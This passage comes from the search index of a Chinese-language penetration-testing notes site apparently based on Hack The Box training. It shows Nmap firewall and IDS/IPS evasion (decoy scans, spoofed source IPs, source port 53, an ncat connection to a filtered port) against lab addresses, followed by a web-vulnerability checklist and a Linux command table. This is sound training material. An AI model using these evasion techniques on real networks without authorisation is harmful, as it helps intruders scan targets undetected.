( <code>-sA</code>)\uff0c\u6211\u4eec\u83b7\u5f97<code>RST</code>\u6807\u5fd7\uff0c\u56e0\u4e3a TCP \u7aef\u53e3 22 \u662f\u6253\u5f00\u7684\u3002\u5bf9\u4e8e TCP \u7aef\u53e3 25\uff0c\u6211\u4eec\u6ca1\u6709\u6536\u5230\u4efb\u4f55\u8fd4\u56de\u7684\u6570\u636e\u5305\uff0c\u8fd9\u8868\u660e\u6570\u636e\u5305\u5c06\u88ab\u4e22\u5f03\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#idsips_1","title":"\u68c0\u6d4b IDS/IPS","text":"<p>\u4e0e\u9632\u706b\u5899\u53ca\u5176\u89c4\u5219\u4e0d\u540c\uff0cIDS/IPS \u7cfb\u7edf\u7684\u68c0\u6d4b\u8981\u56f0\u96be\u5f97\u591a\uff0c\u56e0\u4e3a\u5b83\u4eec\u662f\u88ab\u52a8\u6d41\u91cf\u76d1\u63a7\u7cfb\u7edf\u3002<code>IDS systems</code>\u68c0\u67e5\u4e3b\u673a\u4e4b\u95f4\u7684\u6240\u6709\u8fde\u63a5\u3002\u5982\u679c IDS \u53d1\u73b0\u5305\u542b\u5b9a\u4e49\u7684\u5185\u5bb9\u6216\u89c4\u8303\u7684\u6570\u636e\u5305\uff0c\u7ba1\u7406\u5458\u4f1a\u6536\u5230\u901a\u77e5\u5e76\u5728\u6700\u574f\u7684\u60c5\u51b5\u4e0b\u91c7\u53d6\u9002\u5f53\u7684\u63aa\u65bd\u3002</p> <p><code>IPS systems</code>\u91c7\u53d6\u7ba1\u7406\u5458\u81ea\u4e3b\u914d\u7f6e\u7684\u63aa\u65bd\uff0c\u81ea\u52a8\u9632\u8303\u6f5c\u5728\u653b\u51fb\u3002\u5fc5\u987b\u77e5\u9053 IDS \u548c IPS \u662f\u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u4e14 IPS \u662f\u5bf9 IDS \u7684\u8865\u5145\u3002</p> <p><code>VPS</code>\u5efa\u8bae\u4f7f\u7528\u591a\u4e2a\u5177\u6709\u4e0d\u540c IP \u5730\u5740\u7684\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668 ( ) \u6765\u786e\u5b9a\u6b64\u7c7b\u7cfb\u7edf\u5728\u6e17\u900f\u6d4b\u8bd5\u671f\u95f4\u662f\u5426\u5728\u76ee\u6807\u7f51\u7edc\u4e0a\u3002\u5982\u679c\u7ba1\u7406\u5458\u5728\u76ee\u6807\u7f51\u7edc\u4e0a\u68c0\u6d4b\u5230\u6b64\u7c7b\u6f5c\u5728\u653b\u51fb\uff0c\u7b2c\u4e00\u6b65\u5c31\u662f\u963b\u6b62\u6f5c\u5728\u653b\u51fb\u6765\u81ea\u7684 IP \u5730\u5740\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5c06\u65e0\u6cd5\u518d\u4f7f\u7528\u8be5 IP \u5730\u5740\u8bbf\u95ee\u7f51\u7edc\uff0c\u6211\u4eec\u7684\u4e92\u8054\u7f51\u670d\u52a1\u63d0\u4f9b\u5546 ( <code>ISP</code>) \u5c06\u88ab\u8054\u7cfb\u5e76\u88ab\u963b\u6b62\u8bbf\u95ee\u4e92\u8054\u7f51\u3002</p> <ul> <li><code>IDS systems</code>\u901a\u5e38\u5355\u72ec\u5b58\u5728\u53ef\u4ee5\u5e2e\u52a9\u7ba1\u7406\u5458\u68c0\u6d4b\u5bf9\u5176\u7f51\u7edc\u7684\u6f5c\u5728\u653b\u51fb\u3002\u7136\u540e\u4ed6\u4eec\u53ef\u4ee5\u51b3\u5b9a\u5982\u4f55\u5904\u7406\u6b64\u7c7b\u8fde\u63a5\u3002\u6211\u4eec\u53ef\u4ee5\u89e6\u53d1\u7ba1\u7406\u5458\u7684\u67d0\u4e9b\u5b89\u5168\u63aa\u65bd\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u79ef\u6781\u626b\u63cf\u5355\u4e2a\u7aef\u53e3\u53ca\u5176\u670d\u52a1\u3002\u6839\u636e\u662f\u5426\u91c7\u53d6\u4e86\u5177\u4f53\u7684\u5b89\u5168\u63aa\u65bd\uff0c\u6211\u4eec\u53ef\u4ee5\u68c0\u6d4b\u51fa\u7f51\u7edc\u4e2d\u662f\u5426\u5b58\u5728\u4e00\u4e9b\u76d1\u63a7\u5e94\u7528\u3002</li> <li>\u786e\u5b9a<code>IPS system</code>\u76ee\u6807\u7f51\u7edc\u4e2d\u662f\u5426\u5b58\u5728\u6b64\u7c7b\u95ee\u9898\u7684\u4e00\u79cd\u65b9\u6cd5\u662f\u4ece\u5355\u4e2a\u4e3b\u673a\u8fdb\u884c\u626b\u63cf ( <code>VPS</code>)\u3002\u5982\u679c\u5728\u4efb\u4f55\u65f6\u5019\u8be5\u4e3b\u673a\u88ab\u963b\u6b62\u5e76\u4e14\u65e0\u6cd5\u8bbf\u95ee\u76ee\u6807\u7f51\u7edc\uff0c\u6211\u4eec\u5c31\u77e5\u9053\u7ba1\u7406\u5458\u5df2\u7ecf\u91c7\u53d6\u4e86\u4e00\u4e9b\u5b89\u5168\u63aa\u65bd\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u6211\u4eec\u7684\u6e17\u900f\u6d4b\u8bd5\u4e0e\u53e6\u4e00\u4e2a<code>VPS</code>\u3002</li> </ul> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u77e5\u9053\u6211\u4eec\u9700\u8981\u66f4\u5b89\u9759\u5730\u8fdb\u884c\u626b\u63cf\uff0c\u5e76\u4e14\u5728\u6700\u597d\u7684\u60c5\u51b5\u4e0b\uff0c\u4f2a\u88c5\u4e0e\u76ee\u6807\u7f51\u7edc\u53ca\u5176\u670d\u52a1\u7684\u6240\u6709\u4ea4\u4e92\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_44","title":"\u8bf1\u9975","text":"<p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u7ba1\u7406\u5458\u539f\u5219\u4e0a\u4f1a\u963b\u6b62\u6765\u81ea\u4e0d\u540c\u5730\u533a\u7684\u7279\u5b9a\u5b50\u7f51\u3002\u8fd9\u4f1a\u963b\u6b62\u5bf9\u76ee\u6807\u7f51\u7edc\u7684\u4efb\u4f55\u8bbf\u95ee\u3002\u53e6\u4e00\u4e2a\u4f8b\u5b50\u662f IPS \u4ec0\u4e48\u65f6\u5019\u5e94\u8be5\u963b\u6b62\u6211\u4eec\u3002\u56e0\u6b64\uff0c\u8bf1\u9975\u626b\u63cf\u65b9\u6cd5 ( <code>-D</code>) \u662f\u6b63\u786e\u7684\u9009\u62e9\u3002\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0cNmap \u4f1a\u751f\u6210\u5404\u79cd\u968f\u673a IP \u5730\u5740\uff0c\u5e76\u5c06\u5176\u63d2\u5165\u5230 IP \u6807\u5934\u4e2d\uff0c\u4ee5\u4f2a\u88c5\u6240\u53d1\u9001\u6570\u636e\u5305\u7684\u6765\u6e90\u3002\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u751f\u6210\u968f\u673a ( <code>RND</code>) \u4e2a\u7279\u5b9a\u6570\u91cf\uff08\u4f8b\u5982\uff1a<code>5</code>\uff09\u7684 IP \u5730\u5740\uff0c\u7528\u5192\u53f7 (<code>:</code>). \u7136\u540e\u6211\u4eec\u7684\u771f\u5b9e IP \u5730\u5740\u968f\u673a\u653e\u7f6e\u5728\u751f\u6210\u7684 IP \u5730\u5740\u4e4b\u95f4\u3002\u56e0\u6b64\uff0c\u5728\u4e0b\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u7684\u771f\u5b9e IP \u5730\u5740\u4f4d\u4e8e\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u3002\u53e6\u4e00\u4e2a\u5173\u952e\u70b9\u662f\u8bf1\u9975\u5fc5\u987b\u662f\u6d3b\u7684\u3002\u5426\u5219\uff0c\u7531\u4e8e SYN \u6cdb\u6d2a\u5b89\u5168\u673a\u5236\uff0c\u76ee\u6807\u4e0a\u7684\u670d\u52a1\u53ef\u80fd\u65e0\u6cd5\u8bbf\u95ee\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_45","title":"\u4f7f\u7528\u8bf1\u9975\u626b\u63cf","text":"<p>\u4f7f\u7528\u8bf1\u9975\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:14 CEST\nSENT (0.0378s) TCP 102.52.161.59:59289 &gt; 10.129.2.28:80 S ttl=42 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0378s) TCP 10.10.14.2:59289 &gt; 10.129.2.28:80 S ttl=59 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 210.120.38.29:59289 &gt; 10.129.2.28:80 S ttl=37 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 191.6.64.171:59289 &gt; 10.129.2.28:80 S ttl=38 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 184.178.194.209:59289 &gt; 10.129.2.28:80 S ttl=39 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 43.21.121.33:59289 &gt; 10.129.2.28:80 S ttl=55 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nRCVD (0.1370s) TCP 10.129.2.28:80 &gt; 10.10.14.2:59289 SA ttl=64 id=0 iplen=44  seq=4056111701 win=64240 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up (0.099s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.15 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 80</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>-sS</code> \u5728\u6307\u5b9a\u7aef\u53e3\u4e0a\u6267\u884c SYN \u626b\u63cf\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-D RND:5</code> \u751f\u6210\u4e94\u4e2a\u968f\u673a IP \u5730\u5740\uff0c\u6307\u793a\u8fde\u63a5\u6765\u81ea\u7684\u6e90 IP\u3002 <p>\u6b3a\u9a97\u6027\u6570\u636e\u5305\u901a\u5e38\u4f1a\u88ab ISP \u548c\u8def\u7531\u5668\u8fc7\u6ee4\u6389\uff0c\u5373\u4f7f\u5b83\u4eec\u6765\u81ea\u76f8\u540c\u7684\u7f51\u7edc\u8303\u56f4\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u6307\u5b9a\u6211\u4eec\u7684 VPS \u670d\u52a1\u5668\u7684 IP \u5730\u5740\uff0c\u5e76\u7ed3\u5408<code>IP ID</code>IP \u6807\u5934\u4e2d\u7684\u201c\u201d\u64cd\u4f5c\u6765\u4f7f\u7528\u5b83\u4eec\u6765\u626b\u63cf\u76ee\u6807\u3002</p> <p>\u53e6\u4e00\u79cd\u60c5\u51b5\u662f\u53ea\u6709\u4e2a\u522b\u5b50\u7f51\u65e0\u6cd5\u8bbf\u95ee\u670d\u52a1\u5668\u7684\u7279\u5b9a\u670d\u52a1\u3002\u6240\u4ee5\u6211\u4eec\u4e5f\u53ef\u4ee5\u624b\u52a8\u6307\u5b9a\u6e90IP\u5730\u5740( <code>-S</code>) \u6765\u6d4b\u8bd5\u7528\u8fd9\u4e2a\u662f\u5426\u80fd\u5f97\u5230\u66f4\u597d\u7684\u7ed3\u679c\u3002\u8bf1\u9975\u53ef\u7528\u4e8e SYN\u3001ACK\u3001ICMP \u626b\u63cf\u548c\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u626b\u63cf\u3002\u90a3\u4e48\u8ba9\u6211\u4eec\u770b\u770b\u8fd9\u6837\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5e76\u786e\u5b9a\u5b83\u6700\u6709\u53ef\u80fd\u662f\u54ea\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_46","title":"\u6d4b\u8bd5\u9632\u706b\u5899\u89c4\u5219","text":"<p>\u6d4b\u8bd5\u9632\u706b\u5899\u89c4\u5219</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p445 -O\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:23 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.032s latency).\n\nPORT    STATE    SERVICE\n445/tcp filtered microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nToo many fingerprints match this host to give specific OS details\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 3.14 seconds\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#ip_3","title":"\u4f7f\u7528\u4e0d\u540c\u6e90 IP \u626b\u63cf","text":"<p>\u4f7f\u7528\u4e0d\u540c\u6e90 IP \u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:16 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.010s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 4.11 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-p 445</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>-O</code> \u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u626b\u63cf\u3002 <code>-S</code> \u4f7f\u7528\u4e0d\u540c\u7684\u6e90 IP \u5730\u5740\u626b\u63cf\u76ee\u6807\u3002 <code>10.129.2.200</code> \u6307\u5b9a\u6e90IP\u5730\u5740\u3002 <code>-e tun0</code> \u901a\u8fc7\u6307\u5b9a\u63a5\u53e3\u53d1\u9001\u6240\u6709\u8bf7\u6c42\u3002"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#dns","title":"DNS \u4ee3\u7406","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c<code>Nmap</code>\u9664\u975e\u53e6\u6709\u8bf4\u660e\uff0c\u5426\u5219\u6267\u884c\u53cd\u5411 DNS \u89e3\u6790\u4ee5\u67e5\u627e\u6709\u5173\u6211\u4eec\u76ee\u6807\u7684\u66f4\u591a\u91cd\u8981\u4fe1\u606f\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e9b DNS \u67e5\u8be2\u4e5f\u4f1a\u901a\u8fc7\uff0c\u56e0\u4e3a\u5e94\u8be5\u627e\u5230\u5e76\u8bbf\u95ee\u7ed9\u5b9a\u7684 Web \u670d\u52a1\u5668\u3002DNS \u67e5\u8be2\u662f\u901a\u8fc7<code>UDP port 53</code>. \u4ee5\u524d<code>TCP port 53</code>\u4ec5\u7528\u4e8e DNS \u670d\u52a1\u5668\u4e4b\u95f4\u6240\u8c13\u7684\u201c <code>Zone transfers</code>\u201d\u6216\u5927\u4e8e 512 \u5b57\u8282\u7684\u6570\u636e\u4f20\u8f93\u3002\u7531\u4e8e IPv6 \u548c DNSSEC \u6269\u5c55\uff0c\u8fd9\u79cd\u60c5\u51b5\u8d8a\u6765\u8d8a\u591a\u5730\u53d1\u751f\u53d8\u5316\u3002\u8fd9\u4e9b\u66f4\u6539\u5bfc\u81f4\u8bb8\u591a DNS \u8bf7\u6c42\u901a\u8fc7 TCP \u7aef\u53e3 53 \u53d1\u51fa\u3002</p> <p>\u4f46\u662f\uff0c<code>Nmap</code>\u4ecd\u7136\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u79cd\u81ea\u5df1\u6307\u5b9a DNS \u670d\u52a1\u5668\u7684\u65b9\u6cd5 ( <code>--dns-server &lt;ns&gt;,&lt;ns&gt;</code>)\u3002\u5982\u679c\u6211\u4eec\u5904\u4e8e\u975e\u519b\u4e8b\u533a ( <code>DMZ</code>)\uff0c\u8fd9\u79cd\u65b9\u6cd5\u5bf9\u6211\u4eec\u6765\u8bf4\u53ef\u80fd\u662f\u57fa\u672c\u7684\u3002\u516c\u53f8\u7684 DNS \u670d\u52a1\u5668\u901a\u5e38\u6bd4\u6765\u81ea Internet \u7684\u670d\u52a1\u5668\u66f4\u53d7\u4fe1\u4efb\u3002\u56e0\u6b64\uff0c\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\u4e0e\u5185\u90e8\u7f51\u7edc\u7684\u4e3b\u673a\u8fdb\u884c\u4ea4\u4e92\u3002\u4f5c\u4e3a\u53e6\u4e00\u4e2a\u793a\u4f8b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06( ) \u7528\u4f5c\u626b\u63cf\u7684<code>TCP port 53</code>\u6e90\u7aef\u53e3\u3002<code>--source-port</code>\u5982\u679c\u7ba1\u7406\u5458\u4f7f\u7528\u9632\u706b\u5899\u63a7\u5236\u8fd9\u4e2a\u7aef\u53e3\uff0c\u6ca1\u6709\u6b63\u786e\u8fc7\u6ee4IDS/IPS\uff0c\u6211\u4eec\u7684TCP\u6570\u636e\u5305\u5c31\u4f1a\u88ab\u4fe1\u4efb\u5e76\u901a\u8fc7\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#syn","title":"\u8fc7\u6ee4\u7aef\u53e3\u7684 SYN \u626b\u63cf","text":"<p>\u8fc7\u6ee4\u7aef\u53e3\u7684 SYN \u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 22:50 CEST\nSENT (0.0417s) TCP 10.10.14.2:33436 &gt; 10.129.2.28:50000 S ttl=41 id=21939 iplen=44  seq=736533153 win=1024 &lt;mss 1460&gt;\nSENT (1.0481s) TCP 10.10.14.2:33437 &gt; 10.129.2.28:50000 S ttl=46 id=6446 iplen=44  seq=736598688 win=1024 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up.\n\nPORT      STATE    SERVICE\n50000/tcp filtered ibm-db2\n\nNmap done: 1 IP address (1 host up) scanned in 2.06 seconds\n</code></pre>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#dns-syn","title":"\u4ece DNS \u7aef\u53e3\u8fdb\u884c SYN \u626b\u63cf","text":"<p>\u4ece DNS \u7aef\u53e3\u8fdb\u884c SYN \u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53\n\nSENT (0.0482s) TCP 10.10.14.2:53 &gt; 10.129.2.28:50000 S ttl=58 id=27470 iplen=44  seq=4003923435 win=1024 &lt;mss 1460&gt;\nRCVD (0.0608s) TCP 10.129.2.28:50000 &gt; 10.10.14.2:53 SA ttl=64 id=0 iplen=44  seq=540635485 win=64240 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up (0.013s latency).\n\nPORT      STATE SERVICE\n50000/tcp open  ibm-db2\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.08 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 50000</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>-sS</code> \u5728\u6307\u5b9a\u7aef\u53e3\u4e0a\u6267\u884c SYN \u626b\u63cf\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>--source-port 53</code> \u4ece\u6307\u5b9a\u7684\u6e90\u7aef\u53e3\u6267\u884c\u626b\u63cf\u3002 <p>\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u53d1\u73b0\u9632\u706b\u5899\u63a5\u53d7<code>TCP port 53</code>\uff0c\u5f88\u53ef\u80fd IDS/IPS \u8fc7\u6ee4\u5668\u7684\u914d\u7f6e\u4e5f\u6bd4\u5176\u4ed6\u8fc7\u6ee4\u5668\u5f31\u5f97\u591a\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5c1d\u8bd5\u4f7f\u7528\u8fde\u63a5\u5230\u8fd9\u4e2a\u7aef\u53e3\u6765\u6d4b\u8bd5\u8fd9\u4e00\u70b9<code>Netcat</code>\u3002</p>"},{"location":"CheetSheet/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_47","title":"\u8fde\u63a5\u5230\u8fc7\u6ee4\u7aef\u53e3","text":"<p>\u8fde\u63a5\u5230\u8fc7\u6ee4\u7aef\u53e3</p> <pre><code>darkinga@htb[/htb]$ ncat -nv --source-port 53 10.129.2.28 50000\n\nNcat: Version 7.80 ( https://nmap.org/ncat )\nNcat: Connected to 10.129.2.28:50000.\n220 ProFTPd\n</code></pre>"},{"location":"CheetSheet/WEB%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B8%85%E5%8D%95/","title":"WEB \u6e17\u900f\u6d4b\u8bd5\u6e05\u5355","text":""},{"location":"CheetSheet/WEB%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B8%85%E5%8D%95/#proxies","title":"Proxies","text":"<p>WEB \u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u4f7f\u7528\u67d0\u79cd\u4e2d\u95f4\u4ee3\u7406\uff0c\u8fd9\u4e9b\u4ee3\u7406\u53ef\u80fd\u88ab\u7528\u4e8e\u6f0f\u6d1e\u5229\u7528\u3002\u8fd9\u4e9b\u6f0f\u6d1e\u9700\u8981\u6709\u4e00\u4e2a\u6613\u53d7\u653b\u51fb\u7684\u4ee3\u7406\uff0c\u4f46\u4ed6\u4eec\u901a\u5e38\u8fd8\u9700\u8981\u5728\u540e\u7aef\u6709\u4e00\u4e9b\u989d\u5916\u7684\u6f0f\u6d1e\u3002</p> <p>[][x]</p>"},{"location":"CheetSheet/WEB%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B8%85%E5%8D%95/#_1","title":"\u7528\u6237\u8f93\u5165","text":"<p>\u53cd\u5c04\u6570\u636e\u8f93\u5165\u7684\u6570\u636e\u53ef\u80fd\u4ee5\u67d0\u79cd\u65b9\u5f0f\u53cd\u6620\u5728\u54cd\u5e94\u4e2d\uff0c\u5219\u8be5\u9875\u9762\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u51e0\u4e2a\u95ee\u9898\u7684\u5f71\u54cd\u3002</p> <p>Client Side Template Injection</p> <p>Command Injection</p> <p>CRLF</p> <p>Dangling Markup</p> <p>File Inclusion/Path traversal</p> <p>Open Redirect</p> <p>Prototype Pollution to XSS</p> <p>Server Side Inclusion/Edge Side Inclusion</p> <p>Server Side Request Forgery</p> <p>Server Side Template Injection</p> <p>Reverse Tab Nabbing</p> <p>XSLT Server Side Injection</p> <p>XSS</p> <p>XSSi</p> <p>XS-Search</p>"},{"location":"CheetSheet/htb%E5%A4%87%E5%BF%98%E5%BD%95/","title":"Htb\u5907\u5fd8\u5f55","text":"<p>Command</p> <p>Description</p> <p><code>man &lt;tool&gt;</code></p> <p>Opens man pages for the specified tool.</p> <p><code>&lt;tool&gt; -h</code></p> <p>Prints the help page of the tool.</p> <p><code>apropos &lt;keyword&gt;</code></p> <p>Searches through man pages' descriptions for instances of a given keyword.</p> <p><code>cat</code></p> <p>Concatenate and print files.</p> <p><code>whoami</code></p> <p>Displays current username.</p> <p><code>id</code></p> <p>Returns users identity.</p> <p><code>hostname</code></p> <p>Sets or prints the name of the current host system.</p> <p><code>uname</code></p> <p>Prints operating system name.</p> <p><code>pwd</code></p> <p>Returns working directory name.</p> <p><code>ifconfig</code></p> <p>The <code>ifconfig</code> utility is used to assign or view an address to a network interface and/or configure network interface parameters.</p> <p><code>ip</code></p> <p>Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels.</p> <p><code>netstat</code></p> <p>Shows network status.</p> <p><code>ss</code></p> <p>Another utility to investigate sockets.</p> <p><code>ps</code></p> <p>Shows process status.</p> <p><code>who</code></p> <p>Displays who is logged in.</p> <p><code>env</code></p> <p>Prints environment or sets and executes a command.</p> <p><code>lsblk</code></p> <p>Lists block devices.</p> <p><code>lsusb</code></p> <p>Lists USB devices.</p> <p><code>lsof</code></p> <p>Lists opened files.</p> <p><code>lspci</code></p> <p>Lists PCI devices.</p> <p><code>sudo</code></p> <p>Execute command as a different user.</p> <p><code>su</code></p> <p>The <code>su</code> utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser). A shell is then executed.</p> <p><code>useradd</code></p> <p>Creates a new user or update default new user information.</p> <p><code>userdel</code></p> <p>Deletes a user account and related files.</p> <p><code>usermod</code></p> <p>Modifies a user account.</p> <p><code>addgroup</code></p> <p>Adds a group to the system.</p> <p><code>delgroup</code></p> <p>Removes a group from the system.</p> <p><code>passwd</code></p> <p>Changes user password.</p> <p><code>dpkg</code></p> <p>Install, remove and configure Debian-based packages.</p> <p><code>apt</code></p> <p>High-level package management command-line utility.</p> <p><code>aptitude</code></p> <p>Alternative to <code>apt</code>.</p> <p><code>snap</code></p> <p>Install, remove and configure snap packages.</p> <p><code>gem</code></p> <p>Standard package manager for Ruby.</p> <p><code>pip</code></p> <p>Standard package manager for Python.</p> <p><code>git</code></p> <p>Revision control system command-line utility.</p> <p><code>systemctl</code></p> <p>Command-line based service and systemd control manager.</p> <p><code>ps</code></p> <p>Prints a snapshot of the current processes.</p> <p><code>journalctl</code></p> <p>Query the systemd journal.</p> <p><code>kill</code></p> <p>Sends a signal to a process.</p> <p><code>bg</code></p> <p>Puts a process into background.</p> <p><code>jobs</code></p> <p>Lists all processes that are running in the background.</p> <p><code>fg</code></p> <p>Puts a process into the foreground.</p> <p><code>curl</code></p> <p>Command-line utility to transfer data from or to a server.</p> <p><code>wget</code></p> <p>An alternative to <code>curl</code> that downloads files from FTP or HTTP(s) server.</p> <p><code>python3 -m http.server</code></p> <p>Starts a Python3 web server on TCP port 8000.</p> <p><code>ls</code></p> <p>Lists directory contents.</p> <p><code>cd</code></p> <p>Changes the directory.</p> <p><code>clear</code></p> <p>Clears the terminal.</p> <p><code>touch</code></p> <p>Creates an empty file.</p> <p><code>mkdir</code></p> <p>Creates a directory.</p> <p><code>tree</code></p> <p>Lists the 